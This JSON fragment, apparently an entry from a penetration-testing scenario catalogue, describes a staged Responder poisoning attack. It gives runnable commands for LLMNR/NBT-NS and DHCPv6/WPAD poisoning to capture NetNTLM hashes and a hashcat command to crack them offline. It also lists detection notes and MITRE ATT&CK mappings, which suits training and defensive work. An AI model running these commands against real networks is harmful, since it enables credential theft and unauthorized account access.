  "metadata": {
    "descriptionHtml": "<p>This scenario models a staged Responder operation that starts in passive analysis mode, then escalates to active poisoning paths (including DHCPv6/WPAD controls), and finally routes captured artifacts into offline cracking. The structure emphasizes safe progression and visibility-first operation.</p>",
    "commandsBlock": "# Step 1: Passive baseline\n$ sudo python3 Responder.py -I eth0 -A -v\n\n# Step 2: Enable stronger poisoning controls\n$ sudo python3 Responder.py -I eth0 --dhcpv6 -v\n$ sudo python3 Responder.py -I eth0 -Pvd\n\n# Step 3: Full active capture\n$ sudo python3 Responder.py -I eth0 -v\n\n# Step 4: Crack captured artifacts\n$ hashcat -m 5600 smb-ntlmv2.txt wordlist.txt",
    "extraInfo": [
      "Responder operational flags: -A, --dhcpv6, -Pvd",
      "Offline cracking handoff with hashcat/john"
    ],
    "prerequisites": [
      "Network position to influence victim name-resolution/auth behavior",
      "Reachable victim services and authorized engagement scope",
      "Prepared cracking inputs for captured hashes"
    ],
    "attackerGains": [
      "Captured NetNTLM/Kerberos authentication material",
      "Recovered credentials from offline cracking"
    ],
    "detectionNotes": [
      "Disable LLMNR/NBT-NS where possible and enforce SMB signing",
      "Monitor DHCPv6/WPAD anomalies and rogue responder fingerprints",
      "Alert on abnormal authentication failures or destination changes"
    ],
    "mitreCategories": [
      "T1040",
      "T1557.003",
      "T1557.001",
      "T1110.002",
      "T1078"
    ]
  },
